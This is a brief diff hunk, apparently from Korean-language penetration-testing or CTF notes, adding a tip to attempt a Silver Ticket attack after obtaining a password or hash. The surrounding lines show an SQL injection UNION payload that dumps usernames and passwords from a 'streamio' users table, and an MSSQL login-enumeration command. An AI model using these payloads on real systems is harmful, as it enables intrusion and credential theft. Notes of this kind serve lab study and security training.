@@ -306,6 +306,7 @@ SELECT 1,CONCAT(username,':',password),3,4,5,6 from streamio..users;-- -
 ```
 
 ### Silver Ticket
+- 비밀번호 혹은 해시를 획득하였을 때 공격을 시도해볼 것.
 ```mssql
 # MSSQL에 로그인 가능한 유저 확인(sysadmin 활성화 확인)
 enum_logins
